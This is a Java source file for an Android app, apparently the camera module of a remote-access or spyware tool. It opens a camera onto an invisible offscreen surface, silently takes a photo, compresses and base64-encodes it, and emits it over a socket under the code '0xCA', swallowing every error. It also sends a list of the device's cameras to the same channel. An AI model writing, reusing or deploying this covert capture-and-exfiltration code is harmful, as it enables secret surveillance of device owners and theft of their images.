package com.fason.app.features.camera;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Base64;

import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class CameraManager {

    private final Context ctx;
    private Camera camera;

    public CameraManager(Context context) {
        this.ctx = context;
    }

    public void startUp(int camId) {
        try {
            camera = Camera.open(camId);
            if (camera == null) return;

            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();
            
            final int id = camId;
            camera.takePicture(null, null, (data, cam) -> {
                release();
                send(data, id);
            });
        } catch (Exception ignored) {}
    }

    private void send(byte[] data, int camId) {
        if (data == null || data.length == 0) return;
        try {
            Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bmp.compress(Bitmap.CompressFormat.JPEG, 20, bos);

            JSONObject obj = new JSONObject();
            obj.put("image", true);
            obj.put("cameraId", camId);
            obj.put("buffer", Base64.encodeToString(bos.toByteArray(), Base64.NO_WRAP));
            SocketClient.getInstance().getSocket().emit("0xCA", obj);
        } catch (Exception ignored) {}
    }

    private void release() {
        if (camera != null) {
            try { camera.stopPreview(); camera.release(); } catch (Exception ignored) {}
            camera = null;
        }
    }

    public JSONObject findCameraList() {
        if (!ctx.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_ANY)) return null;

        try {
            JSONObject result = new JSONObject();
            JSONArray list = new JSONArray();
            result.put("camList", true);

            int count = Camera.getNumberOfCameras();
            for (int i = 0; i < count; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);

                JSONObject cam = new JSONObject();
                cam.put("id", i);
                cam.put("name", info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT ? "Front" : "Back");
                list.put(cam);
            }
            result.put("list", list);
            return result;
        } catch (Exception e) {
            return null;
        }
    }
}
